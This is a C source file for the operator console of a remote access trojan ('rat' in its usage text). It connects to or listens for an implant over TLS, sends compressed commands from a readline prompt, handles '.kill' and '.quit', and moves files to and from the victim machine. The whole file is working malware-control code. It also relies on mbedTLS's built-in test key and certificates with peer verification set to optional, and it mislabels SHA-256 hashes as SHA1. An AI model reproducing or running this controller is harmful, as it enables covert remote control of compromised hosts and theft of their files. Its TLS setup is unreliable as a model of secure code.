#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <signal.h>
#include <fcntl.h>
#include <poll.h>

#include "mbedtls/net.h"
#include "mbedtls/debug.h"
#include "mbedtls/ssl.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/error.h"
#include "mbedtls/certs.h"
#include "mbedtls/sha256.h"

//#include "zlib.h"
#include "miniz.c"

#include "readline/readline.h"
#include "readline/history.h"

#define BUFFER_SIZE 16384

struct compression {
    unsigned char *orig_buffer;
    unsigned char *transformed_buffer;
    int orig_size;
    int transformed_size;
};

static void compress_buffer(struct compression* compress);
static void decompress_buffer(struct compression* decompress);
static void upload_file(struct compression *compress, mbedtls_ssl_context ssl);
static void download_file(struct compression *compress, mbedtls_ssl_context ssl);

static void my_debug( void *ctx, int level, const char *file, int line, const char *str )
{
    ((void) level);
    fprintf( (FILE *) ctx, "%s:%04d: %s", file, line, str );
    fflush(  (FILE *) ctx  );
}

int main(int argc, char *argv[])
{
    char *ip_addr_string = NULL, *port = NULL;
    int ret = 0;
    uint32_t flags;
    unsigned char *file_buffer = NULL;
    char *new_buffer = NULL;
    struct pollfd fds[256];
    struct compression compress;
    int nfds = 1;
    unsigned char client_ip[19] = { 0 };
    size_t cliip_len = 0;

    //mbedTLS variables
    mbedtls_net_context sockfd;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ssl_context ssl;
    mbedtls_ssl_config conf;
    mbedtls_x509_crt srvcert;
    mbedtls_pk_context pkey;

    mbedtls_net_init( &sockfd );
    mbedtls_ssl_init( &ssl );
    mbedtls_ssl_config_init( &conf );
    mbedtls_x509_crt_init( &srvcert );
    mbedtls_pk_init( &pkey );
    mbedtls_ctr_drbg_init( &ctr_drbg );
    mbedtls_entropy_init( &entropy );

    if (argc == 2) {
        ip_addr_string = "0.0.0.0";
        port = argv[1];
    } else if (argc == 3){
        port = argv[2];
        ip_addr_string = argv[1];
    } else {
        printf("\n Usage: %s <ip of server> <port of rat> \n", argv[0]);
        return 1;
    }

    printf( "\n  . Seeding the random number generator..." );
    fflush( stdout );
    mbedtls_entropy_init( &entropy );
    if ( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy, NULL, 256 ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ctr_drbg_seed returned %d\n", ret );
        return 2;
    }
    printf(" ok\n");

    printf( "  . Loading the CA root certificate ..." );
    fflush( stdout );
    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        return 3;
    }

    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_cas_pem, mbedtls_test_cas_pem_len );
    if ( ret < 0 ) {
        printf( " failed\n  !  mbedtls_x509_crt_parse returned -0x%x\n\n", -ret );
        return 3;
    }

    ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_pk_parse_key returned %d\n\n", ret );
        return 3;
    }
    printf( " ok\n" );

    if (strncmp(ip_addr_string, "0.0.0.0", 9) == 0){
        printf("Listening on tcp %s:%s...\n", ip_addr_string, port);
        if ( ( ret = mbedtls_net_bind( &sockfd, NULL, port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_bind returned %d\n\n", ret );
            return 4;
        }
        
        if ( ( ret = mbedtls_net_accept( &sockfd, &sockfd, client_ip, sizeof(client_ip), &cliip_len ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_accept returned %d\n\n", ret );
            return 9;
        }
        printf("Client: %s\n", client_ip);

        printf("Server Mode\n");
        if ( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            return 5;
        }

    } else {
        printf("Connecting to tcp %s/%s...\n", ip_addr_string, port);
        if ( ( ret = mbedtls_net_connect( &sockfd, ip_addr_string, port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_connect returned %d\n\n", ret );
            return 4;
        }

        if ( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            return 5;
        }
        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_OPTIONAL );
    }

    printf( "  . Setting up the SSL/TLS structure..." );
    fflush( stdout );
    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );
    mbedtls_ssl_conf_dbg( &conf, my_debug, stdout );
    mbedtls_ssl_conf_ca_chain( &conf, srvcert.next, NULL );
    if( ( ret = mbedtls_ssl_conf_own_cert( &conf, &srvcert, &pkey ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ssl_conf_own_cert returned %d\n\n", ret );
        return 6;
    }
    
    if ( ( ret = mbedtls_ssl_setup( &ssl, &conf ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
        return 6;
    }
    printf( " ok\n" );

    mbedtls_ssl_set_bio( &ssl, &sockfd, mbedtls_net_send, mbedtls_net_recv, NULL );

    printf( "  . Performing the SSL/TLS handshake..." );
    fflush( stdout );
    while ( ( ret = mbedtls_ssl_handshake( &ssl ) ) != 0 ) {
        if ( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
            printf( " failed\n  ! mbedtls_ssl_handshake returned -0x%x\n\n", -ret );
            return 8;
        }
    }
    printf( " ok\n" );

    printf( "  . Verifying peer X.509 certificate..." );
    /* In real life, we probably want to bail out when ret != 0 */
    if( ( flags = mbedtls_ssl_get_verify_result( &ssl ) ) != 0 ) {
        char vrfy_buf[512];

        printf( " failed\n" );
        mbedtls_x509_crt_verify_info( vrfy_buf, sizeof( vrfy_buf ), "  ! ", flags );
        printf( "%s\n", vrfy_buf );
    } else {
        printf( " ok\n" );
    }

    printf("Cipher: %s\n", mbedtls_ssl_get_ciphersuite( &ssl ));

    /*************************************************************/
    /* Set up the initial listening socket                        */
    /*************************************************************/
    memset(fds, -1, sizeof(fds));
    fds[0].fd = sockfd.fd;
    fds[0].events = POLLIN;
    fds[0].revents = 0;

    memset(&compress, 0, sizeof(struct compression));
    if ((compress.orig_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.orig_buffer, 0, BUFFER_SIZE);

    if ((compress.transformed_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);

    using_history();
    if ( mbedtls_ssl_read(&ssl, client_ip, sizeof(client_ip)) == -1){
        printf("Error getting remote IP address\n");
        strncpy((char*)client_ip, "0.0.0.0", 8);
    }
    ip_addr_string = strncat((char*)client_ip, "> ", 2);

    while(1) {
        memset(compress.orig_buffer, 0, BUFFER_SIZE);
        memset(compress.transformed_buffer, 0, BUFFER_SIZE);

        new_buffer = readline(ip_addr_string);
        add_history(new_buffer);
        strncpy((char*)compress.orig_buffer, new_buffer, BUFFER_SIZE);
        free(new_buffer);
        compress.orig_size = strnlen((char*)compress.orig_buffer, BUFFER_SIZE);
        compress_buffer(&compress);

        if ( mbedtls_ssl_write( &ssl, compress.transformed_buffer, compress.transformed_size) == -1 ) {
            perror("Error sending");
            goto Cleanup;
        }

        if (strncmp(".kill", (char*)compress.orig_buffer, 5) == 0) {
            printf("Finishing...\n");
            goto Cleanup;
        }

        if (strncmp(".quit", (char*)compress.orig_buffer, 5) == 0) {
            printf("Disconnecting...\n");
            goto Cleanup;
        }

        if (strncmp("upload ", (char*)compress.orig_buffer, 7) == 0) {
            upload_file(&compress, ssl);
            continue;
        }

        if (strncmp("download ", (char*)compress.orig_buffer, 9) == 0){
            download_file(&compress, ssl);
            continue;
        }

        //Recv with poll
        if (poll(fds, nfds, -1) < 0) {
            printf("Poll failed\n");
            goto Cleanup;
        }

        if (fds[0].revents & POLLIN) {
            do {
                memset(compress.orig_buffer, 0, BUFFER_SIZE);
                memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                compress.orig_size = mbedtls_ssl_read(&ssl, compress.orig_buffer, BUFFER_SIZE);

                //Got an error or connection closed by client
                if (compress.orig_size == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
                    //Connection closed
                    printf("%s: socket %d hung up\n", ip_addr_string, sockfd.fd);
                    goto Cleanup;
                }

                if (compress.orig_size <= 0) {
                    printf("Error recving: %d\n", compress.orig_size);
                    goto Cleanup;
                }

                //TODO Check return value
                decompress_buffer(&compress);
                printf("%s", compress.transformed_buffer);
                fflush(stdout);
            } while (mbedtls_ssl_get_bytes_avail(&ssl) > 0);
            if (strnlen((char*)compress.transformed_buffer, BUFFER_SIZE) != BUFFER_SIZE) {
                printf("\n\nLength: %zu\n\n", strnlen((char*)compress.transformed_buffer, BUFFER_SIZE));
            }
        }
    } //while loop

    goto Cleanup;

Cleanup:
    free(compress.orig_buffer);
    free(compress.transformed_buffer);
    free(file_buffer);
    mbedtls_net_free( &sockfd );
    mbedtls_x509_crt_free( &srvcert );
    mbedtls_ssl_free( &ssl );
    mbedtls_ssl_config_free( &conf );
    mbedtls_ctr_drbg_free( &ctr_drbg );
    mbedtls_entropy_free( &entropy );

    printf("\nExiting...\n");

    return 0;
}

static void compress_buffer(struct compression* compress)
{
    z_stream defstream;
    defstream.zalloc = Z_NULL;
    defstream.zfree = Z_NULL;
    defstream.opaque = Z_NULL;
    defstream.avail_in = (uInt)compress->orig_size;
    defstream.next_in = (Bytef *)compress->orig_buffer;
    defstream.avail_out = (uInt)BUFFER_SIZE;
    defstream.next_out = (Bytef *)compress->transformed_buffer;

    if (Z_OK != deflateInit(&defstream, Z_DEFAULT_COMPRESSION)) {
        printf("Error compressing\n");
        return;
    }
    deflate(&defstream, Z_FINISH);
    deflateEnd(&defstream);
    compress->transformed_size = defstream.total_out;
}

static void decompress_buffer(struct compression* decompress)
{
    z_stream infstream;
    infstream.zalloc = Z_NULL;
    infstream.zfree = Z_NULL;
    infstream.opaque = Z_NULL;
    infstream.avail_in = (uInt)decompress->orig_size;
    infstream.next_in = (Bytef *)decompress->orig_buffer;
    infstream.avail_out = (uInt)BUFFER_SIZE;
    infstream.next_out = (Bytef *)decompress->transformed_buffer;

    inflateInit(&infstream);
    inflate(&infstream, Z_NO_FLUSH);
    inflateEnd(&infstream);

    decompress->transformed_size = infstream.total_out;
}

static void upload_file(struct compression* compress, mbedtls_ssl_context ssl)
{
    FILE* local_file = NULL;
    char *first_file = NULL, *put_file = NULL;
    unsigned int remain_data = 0, i = 0;
    struct stat st;
    int fd = 0;
    size_t file_size = 0, sent_bytes = 0, total_sent = 0;
    mbedtls_sha256_context file_hash;
    unsigned char sha1_output[32];
    unsigned char sha1_check[32];

    put_file = (char*)compress->orig_buffer;
    strsep(&put_file, " ");
    first_file = strsep(&put_file, " ");
    printf("File upload: %s\n", first_file);

    if (access(first_file, F_OK) == -1){
        printf("File not found\n");
        return;
    }

    if (access(first_file, R_OK) == -1) {
        printf("Access denied\n");
        return;
    }

    local_file = fopen(first_file, "rb");
    if (local_file == NULL) {
        perror("error opening file");
        return;
    }

    fd = fileno(local_file);
    if (fd == -1) {
        perror("Unable to get fileno");
    }

    //Get local file size
    memset(&st, 0, sizeof(struct stat));
    if (stat(first_file, &st) == -1) {
        perror("stat error");
    }

    //Get the file size
    file_size = st.st_size;
    printf("File size %zd bytes\n", file_size);

    //Send file size for the other side to receive
    if ( mbedtls_ssl_write(&ssl, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
        printf("Error: %s", strerror(errno));
        return;
    }

    remain_data = file_size;
    sent_bytes = 0;
    total_sent = 0;

    //Initialize for SHA256 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    compress->orig_size = 0;
    compress->transformed_size = 0;
    // Sending file data
    while ((compress->orig_size = fread(compress->orig_buffer, 1, BUFFER_SIZE, local_file)) > 0) {
        printf("Read: %d\n", compress->orig_size);
        mbedtls_sha256_update(&file_hash, compress->orig_buffer, compress->orig_size);
        compress_buffer(compress);
        sent_bytes += mbedtls_ssl_write(&ssl, compress->transformed_buffer, compress->transformed_size);
        fprintf(stdout, "Sent %zu bytes from file's data, remaining data = %d\n", sent_bytes, remain_data);
        total_sent += compress->orig_size;
        remain_data -= compress->orig_size;
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    }

    if (total_sent < file_size) {
        fprintf(stderr, "incomplete transfer from sendfile: %zu of %zu bytes\n", total_sent, file_size);
    } else {
        printf("Finished transferring %s\n", first_file);
    }
    printf("Compressed: %f%%\n", ((sent_bytes / (double)total_sent)*100));

    mbedtls_sha256_finish(&file_hash, sha1_output);
    printf("\nSHA1 hash: ");
    for (i = 0; i < sizeof(sha1_output); i++) {
        printf("%02x", sha1_output[i]);
    }
    printf("\n");

    if (mbedtls_ssl_read(&ssl, sha1_check, sizeof(sha1_check)) < 0) {
        printf("Error recving Sha1 hash\n");
    }

    if (strncmp((const char*)sha1_output, (const char*)sha1_check, sizeof(sha1_output)) == 0) {
        printf("SHA1 hashes matches\n");
    } else {
        printf("SHA1 hashes don't match\n");
    }

    mbedtls_sha256_free(&file_hash);
    fclose(local_file);

    return;
}

static void download_file(struct compression* compress, mbedtls_ssl_context ssl)
{
    char* command = malloc(BUFFER_SIZE);
    int offset = 0;
    size_t file_size = 0, size_recv = 0 ;
    FILE* local_file = NULL;
    char *first_file = NULL, *second_file = NULL, *command_start = NULL;
    unsigned int remain_data = 0, i = 0;
    unsigned char sha1_output[32];
    unsigned char sha1_check[32];
    mbedtls_sha256_context file_hash;

    command_start = strncpy(command, (char*)compress->orig_buffer, BUFFER_SIZE);
    if (strsep(&command, " ") == NULL){
        perror("Error parsing download");
    }
    first_file = strsep(&command, " ");
    second_file = strsep(&command, " ");
    printf("File download: %s -> %s\n", first_file, second_file);

    if (second_file == NULL){
        printf("Second file is null\n");
        second_file = first_file;
    }

    local_file = fopen(second_file, "wb");
    if (local_file == NULL) {
        fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));
        exit(-1);
    }

    file_size = 0;
    size_recv = 0;
    if ((size_recv = mbedtls_ssl_read(&ssl, (unsigned char*) &file_size, sizeof(size_t))) > 0) {
        if (size_recv == (unsigned int)-1) {
            perror("Error recving");
        }
    }
    printf("File size %zd\n", file_size);

    if (file_size == 0){
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
        compress->orig_size = mbedtls_ssl_read(&ssl, compress->orig_buffer, BUFFER_SIZE);
        decompress_buffer(compress);
        printf("File download error: %s\n", compress->transformed_buffer);
        free(command_start);
        fclose(local_file);
        return;
    }

    //Initialize SHA1 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    remain_data = 0;
    offset = 0;
    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    while (((compress->orig_size = mbedtls_ssl_read(&ssl, compress->orig_buffer, BUFFER_SIZE)) > 0) || (remain_data < file_size)) {
        decompress_buffer(compress);
        mbedtls_sha256_update(&file_hash, compress->transformed_buffer, compress->transformed_size);
        offset = fwrite(compress->transformed_buffer, 1, compress->transformed_size, local_file);
        remain_data += offset;
        fprintf(stdout, "Received %d bytes out of %d bytes\n", remain_data, (int)file_size);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        if (remain_data == file_size) {
            break;
        }
    }
    printf("Finished writing file %s\n", second_file);

    //Hash check
    mbedtls_sha256_finish(&file_hash, sha1_output);
    printf("\nSHA1 hash: ");
    for (i = 0; i < sizeof(sha1_output); i++) {
        printf("%02x", sha1_output[i]);
    }
    printf("\n");

    if (mbedtls_ssl_read(&ssl, sha1_check, sizeof(sha1_check)) < 0) {
        printf("Error recving Sha1 hash\n");
    }

    if (strncmp((const char*)sha1_output, (const char*)sha1_check, sizeof(sha1_output)) == 0) {
        printf("SHA1 hashes matches\n");
    } else {
        printf("SHA1 hashes don't match\n");
    }

    printf("Changing permissions to 644\n");
    if (chmod(second_file, S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH) == -1) {
        printf("Unable to chmod\n");
    }

    free(command_start);
    fclose(local_file);

    return;
}
